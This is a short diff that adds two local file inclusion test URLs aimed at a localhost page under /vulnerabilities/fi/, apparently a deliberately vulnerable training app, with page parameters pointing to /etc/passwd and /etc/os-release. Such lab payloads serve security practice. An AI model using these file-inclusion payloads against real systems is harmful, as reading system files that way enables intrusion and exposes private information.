@@ -1,0 +1,4 @@
+http://localhost/vulnerabilities/fi/?page=/etc/passwd
+
+http://localhost/vulnerabilities/fi/?page=/etc/os-release
+
